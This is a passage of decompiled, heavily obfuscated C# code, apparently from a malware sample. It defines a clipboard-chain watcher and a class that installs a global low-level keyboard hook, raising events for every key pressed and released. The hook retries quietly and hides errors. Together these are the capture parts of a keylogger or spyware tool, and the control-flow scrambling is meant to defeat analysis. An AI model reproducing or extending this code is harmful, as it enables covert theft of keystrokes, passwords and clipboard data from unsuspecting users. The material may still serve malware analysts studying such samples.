
		// Token: 0x04000374 RID: 884
		private int abq;

		// Token: 0x04000375 RID: 885
		private Point abz;

		// Token: 0x04000376 RID: 886
		private afg.ux.sq acd;

		// Token: 0x02000016 RID: 22
		// (Invoke) Token: 0x060000B4 RID: 180
		private delegate int sq(int code, int flags, ref afg.ux.sz data);

		// Token: 0x02000017 RID: 23
		private struct sz
		{
			// Token: 0x04000377 RID: 887
			public Point Point;

			// Token: 0x04000378 RID: 888
			public int Code;

			// Token: 0x04000379 RID: 889
			public int Flags;

			// Token: 0x0400037A RID: 890
			public int Time;

			// Token: 0x0400037B RID: 891
			public int Info;
		}

		// Token: 0x02000018 RID: 24
		// (Invoke) Token: 0x060000B8 RID: 184
		public delegate void tu(object sender, ref afg.ux.tz e);

		// Token: 0x02000019 RID: 25
		// (Invoke) Token: 0x060000BC RID: 188
		public delegate void tv(object sender, ref afg.ux.tz e);

		// Token: 0x0200001A RID: 26
		// (Invoke) Token: 0x060000C0 RID: 192
		public delegate void ty(object sender, ref afg.ux.tz e);

		// Token: 0x0200001B RID: 27
		// (Invoke) Token: 0x060000C4 RID: 196
		public delegate void tx(object sender, ref afg.ux.tz e);

		// Token: 0x0200001C RID: 28
		// (Invoke) Token: 0x060000C8 RID: 200
		public delegate void tw(object sender, ref afg.ux.tz e);

		// Token: 0x0200001D RID: 29
		// (Invoke) Token: 0x060000CC RID: 204
		public delegate void tq(object sender, ref afg.ux.tz e);

		// Token: 0x0200001E RID: 30
		[EditorBrowsable(EditorBrowsableState.Never)]
		public struct tz
		{
			// Token: 0x1700000B RID: 11
			// (get) Token: 0x060000CD RID: 205 RVA: 0x00022B18 File Offset: 0x00020D18
			// (set) Token: 0x060000CE RID: 206 RVA: 0x00022B2C File Offset: 0x00020D2C
			public bool uy
			{
				get
				{
					return this.uv;
				}
				set
				{
					this.uv = value;
				}
			}

			// Token: 0x060000CF RID: 207 RVA: 0x00022B40 File Offset: 0x00020D40
			public tz(MouseButtons _button, int _clicks, int _delta, Point _location)
			{
				this = default(afg.ux.tz);
				this.Button = _button;
				this.Clicks = _clicks;
				this.Delta = _delta;
				this.Location = _location;
			}

			// Token: 0x0400037C RID: 892
			public readonly MouseButtons Button;

			// Token: 0x0400037D RID: 893
			public readonly int Clicks;

			// Token: 0x0400037E RID: 894
			public readonly int Delta;

			// Token: 0x0400037F RID: 895
			public readonly Point Location;

			// Token: 0x04000380 RID: 896
			private bool uv;
		}
	}

	// Token: 0x0200001F RID: 31
	public class acm : NativeWindow
	{
		// Token: 0x060000D0 RID: 208
		[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr SetClipboardViewer(IntPtr aco);

		// Token: 0x060000D1 RID: 209
		[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool ChangeClipboardChain(IntPtr acr, IntPtr acs);

		// Token: 0x060000D2 RID: 210
		[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern long SendMessage(IntPtr acu, int acv, IntPtr acy, IntPtr acx);

		// Token: 0x14000007 RID: 7
		// (add) Token: 0x060000D3 RID: 211 RVA: 0x00022B74 File Offset: 0x00020D74
		// (remove) Token: 0x060000D4 RID: 212 RVA: 0x00022B98 File Offset: 0x00020D98
		public event afg.acm.acl adf
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.acz = (afg.acm.acl)Delegate.Combine(this.acz, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.acz = (afg.acm.acl)Delegate.Remove(this.acz, value);
			}
		}

		// Token: 0x060000D5 RID: 213 RVA: 0x00022BBC File Offset: 0x00020DBC
		public acm()
		{
			this.CreateHandle(new CreateParams());
		}

		// Token: 0x060000D6 RID: 214 RVA: 0x00022BDC File Offset: 0x00020DDC
		public void acw()
		{
			this.ade = afg.acm.SetClipboardViewer(this.Handle);
		}

		// Token: 0x060000D7 RID: 215 RVA: 0x00022BFC File Offset: 0x00020DFC
		public void acq()
		{
			afg.acm.ChangeClipboardChain(this.Handle, this.ade);
		}

		// Token: 0x060000D8 RID: 216 RVA: 0x00022C1C File Offset: 0x00020E1C
		protected override void WndProc(ref Message m)
		{
			afg.acm.acl acl;
			uint num;
			switch (m.Msg)
			{
			case 776:
				IL_B2:
				acl = this.acz;
				if (acl == null)
				{
					goto IL_44;
				}
				num = 337772164u;
				break;
			case 777:
			case 778:
			case 779:
			case 780:
				IL_142:
				base.WndProc(ref m);
				return;
			case 781:
				IL_12D:
				if (!(m.WParam == this.ade))
				{
					goto IL_101;
				}
				num = 1562040021u;
				break;
			default:
				goto IL_69;
			}
			for (;;)
			{
				IL_C1:
				uint num2;
				switch ((num2 = (num ^ 729033115u)) % 10u)
				{
				case 1u:
					goto IL_B2;
				case 2u:
					num = (num2 * 2383845305u ^ 2844895171u);
					continue;
				case 3u:
					goto IL_12D;
				case 4u:
					goto IL_101;
				case 5u:
					num = (num2 * 2513280540u ^ 3933014547u);
					continue;
				case 6u:
					this.ade = m.LParam;
					num = (num2 * 158425737u ^ 1835766321u);
					continue;
				case 7u:
					goto IL_69;
				case 8u:
					goto IL_44;
				case 9u:
					acl(this);
					num = (num2 * 2309843239u ^ 3039493038u);
					continue;
				}
				break;
			}
			goto IL_142;
			IL_44:
			afg.acm.SendMessage(this.ade, m.Msg, m.WParam, m.LParam);
			num = 2041415735u;
			goto IL_C1;
			IL_69:
			num = 1348362490u;
			goto IL_C1;
			IL_101:
			afg.acm.SendMessage(this.ade, m.Msg, m.WParam, m.LParam);
			num = 603713167u;
			goto IL_C1;
		}

		// Token: 0x060000D9 RID: 217 RVA: 0x00022D74 File Offset: 0x00020F74
		protected override void Finalize()
		{
			this.acq();
		}

		// Token: 0x04000381 RID: 897
		private afg.acm.acl acz;

		// Token: 0x04000382 RID: 898
		private IntPtr ade;

		// Token: 0x02000020 RID: 32
		// (Invoke) Token: 0x060000DD RID: 221
		public delegate void acl(afg.acm sender);
	}

	// Token: 0x02000021 RID: 33
	public class adm
	{
		// Token: 0x060000DE RID: 222 RVA: 0x00022D88 File Offset: 0x00020F88
		public adm()
		{
			this.aex = new afg.adm.adl(this.adz);
			this.aew = IntPtr.Zero;
		}

		// Token: 0x060000DF RID: 223
		[DllImport("User32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
		private static extern int SetWindowsHookEx(int ado, afg.adm.adl adp, IntPtr adr, int ads);

		// Token: 0x060000E0 RID: 224
		[DllImport("User32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
		private static extern int CallNextHookEx(int adu, int adv, IntPtr ady, IntPtr adx);

		// Token: 0x060000E1 RID: 225
		[DllImport("User32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
		private static extern bool UnhookWindowsHookEx(int adq);

		// Token: 0x14000008 RID: 8
		// (add) Token: 0x060000E2 RID: 226 RVA: 0x00022DBC File Offset: 0x00020FBC
		// (remove) Token: 0x060000E3 RID: 227 RVA: 0x00022DE0 File Offset: 0x00020FE0
		public static event afg.adm.adj aeq
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				afg.adm.aev = (afg.adm.adj)Delegate.Combine(afg.adm.aev, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				afg.adm.aev = (afg.adm.adj)Delegate.Remove(afg.adm.aev, value);
			}
		}

		// Token: 0x14000009 RID: 9
		// (add) Token: 0x060000E4 RID: 228 RVA: 0x00022E04 File Offset: 0x00021004
		// (remove) Token: 0x060000E5 RID: 229 RVA: 0x00022E28 File Offset: 0x00021028
		public static event afg.adm.adk aez
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				afg.adm.aey = (afg.adm.adk)Delegate.Combine(afg.adm.aey, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				afg.adm.aey = (afg.adm.adk)Delegate.Remove(afg.adm.aey, value);
			}
		}

		// Token: 0x060000E6 RID: 230 RVA: 0x00022E4C File Offset: 0x0002104C
		private int adz(int aef, IntPtr aeg, IntPtr aeh)
		{
			if (aef == 0)
			{
				for (;;)
				{
					IL_1AF:
					uint num = 3807501186u;
					for (;;)
					{
						uint num2;
						afg.adm.adk adk;
						afg.adm.adj adj;
						switch ((num2 = (num ^ 3992845227u)) % 12u)
						{
						case 0u:
							goto IL_11A;
						case 1u:
							if (!(aeg == (IntPtr)256))
							{
								num = (num2 * 419330223u ^ 526252199u);
								continue;
							}
							goto IL_136;
						case 2u:
							goto IL_136;
						case 3u:
							if (aeg == (IntPtr)260)
							{
								num = (num2 * 2052707181u ^ 61802346u);
								continue;
							}
							goto IL_11A;
						case 4u:
							goto IL_1AF;
						case 5u:
							if (adk != null)
							{
								num = (num2 * 1812512181u ^ 3301255934u);
								continue;
							}
							break;
						case 6u:
							if (adj != null)
							{
								num = (num2 * 368888012u ^ 3517776553u);
								continue;
							}
							break;
						case 8u:
						{
							afg.adm.adk adk2 = adk;
							afg.adm.adg adg;
							object obj = Marshal.PtrToStructure(aeh, adg.GetType());
							afg.adm.adg adg2;
							adk2(checked((Keys)((obj != null) ? ((afg.adm.adg)obj) : adg2).vkCode));
							num = 3743108080u;
							continue;
						}
						case 9u:
							if (aeg == (IntPtr)261)
							{
								num = (num2 * 2353312567u ^ 310656599u);
								continue;
							}
							break;
						case 10u:
						{
							afg.adm.adj adj2 = adj;
							afg.adm.adg adg;
							object obj2 = Marshal.PtrToStructure(aeh, adg.GetType());
							afg.adm.adg adg2;
							adj2(checked((Keys)((obj2 != null) ? ((afg.adm.adg)obj2) : adg2).vkCode));
							num = 3743108080u;
							continue;
						}
						case 11u:
							goto IL_0C;
						}
						goto Block_10;
						IL_0C:
						adk = afg.adm.aey;
						num = 4253971774u;
						continue;
						IL_11A:
						if (!(aeg == (IntPtr)257))
						{
							num = 4092011034u;
							continue;
						}
						goto IL_0C;
						IL_136:
						adj = afg.adm.aev;
						num = 3982214613u;
					}
				}
				Block_10:;
			}
			return afg.adm.CallNextHookEx((int)IntPtr.Zero, aef, aeg, aeh);
		}

		// Token: 0x060000E7 RID: 231 RVA: 0x00023024 File Offset: 0x00021224
		public void aer()
		{
			checked
			{
				try
				{
					int num = 0;
					for (;;)
					{
						IL_8C:
						int num2 = 923197247;
						for (;;)
						{
							switch ((num2 ^ 1240667531) % 5)
							{
							case 2:
								goto IL_8C;
							case 3:
								goto IL_07;
							case 4:
								goto IL_50;
							}
							goto Block_3;
							IL_50:
							num++;
							if (num > 10)
							{
								num2 = 750752290;
								continue;
							}
							IL_07:
							this.aew = (IntPtr)afg.adm.SetWindowsHookEx(13, this.aex, (IntPtr)Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
							if (!(this.aew != IntPtr.Zero))
							{
								goto IL_50;
							}
							num2 = 430134378;
						}
					}
					Block_3:;
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x060000E8 RID: 232 RVA: 0x000230E8 File Offset: 0x000212E8
		protected override void Finalize()
		{
			if (!(this.aew == IntPtr.Zero))
			{
				goto IL_12;
			}
			goto IL_62;
			uint num2;
			for (;;)
			{
				IL_3A:
				uint num;
				switch ((num = (num2 ^ 440515580u)) % 4u)
				{
				case 1u:
					afg.adm.UnhookWindowsHookEx((int)this.aew);
					num2 = (num * 1287620225u ^ 2123526850u);
					continue;
				case 2u:
					goto IL_12;
				case 3u:
					goto IL_62;
				}
				break;
			}
			return;
			IL_12:
			num2 = 1807222069u;
			goto IL_3A;
			IL_62:
			base.Finalize();
			num2 = 1295165960u;
			goto IL_3A;
		}

		// Token: 0x04000383 RID: 899
		private static afg.adm.adj aev;

		// Token: 0x04000384 RID: 900
		private static afg.adm.adk aey;

		// Token: 0x04000385 RID: 901
		private const int WH_KEYBOARD_LL = 13;

		// Token: 0x04000386 RID: 902
		private const int HC_ACTION = 0;

		// Token: 0x04000387 RID: 903
		private const int WM_KEYDOWN = 256;

		// Token: 0x04000388 RID: 904
		private const int WM_KEYUP = 257;

		// Token: 0x04000389 RID: 905
		private const int WM_SYSKEYDOWN = 260;

		// Token: 0x0400038A RID: 906
		private const int WM_SYSKEYUP = 261;

		// Token: 0x0400038B RID: 907
		private afg.adm.adl aex;

		// Token: 0x0400038C RID: 908
		private IntPtr aew;

		// Token: 0x02000022 RID: 34
		private struct adg
		{
			// Token: 0x0400038D RID: 909
			public uint vkCode;

			// Token: 0x0400038E RID: 910
			public uint scanCode;

			// Token: 0x0400038F RID: 911
			public afg.adm.adh flags;

			// Token: 0x04000390 RID: 912
			public uint time;

			// Token: 0x04000391 RID: 913
			public UIntPtr dwExtraInfo;
		}

		// Token: 0x02000023 RID: 35
		[Flags]
		private enum adh : uint
		{
			// Token: 0x04000393 RID: 915
			LLKHF_EXTENDED = 1u,
			// Token: 0x04000394 RID: 916
			LLKHF_INJECTED = 16u,
			// Token: 0x04000395 RID: 917
			LLKHF_ALTDOWN = 32u,
			// Token: 0x04000396 RID: 918
			LLKHF_UP = 128u
		}

		// Token: 0x02000024 RID: 36
		// (Invoke) Token: 0x060000EC RID: 236
		public delegate void adj(Keys Key);

		// Token: 0x02000025 RID: 37
		// (Invoke) Token: 0x060000F0 RID: 240
		public delegate void adk(Keys Key);

		// Token: 0x02000026 RID: 38
		// (Invoke) Token: 0x060000F4 RID: 244
		private delegate int adl(int nCode, IntPtr wParam, IntPtr lParam);
	}
}
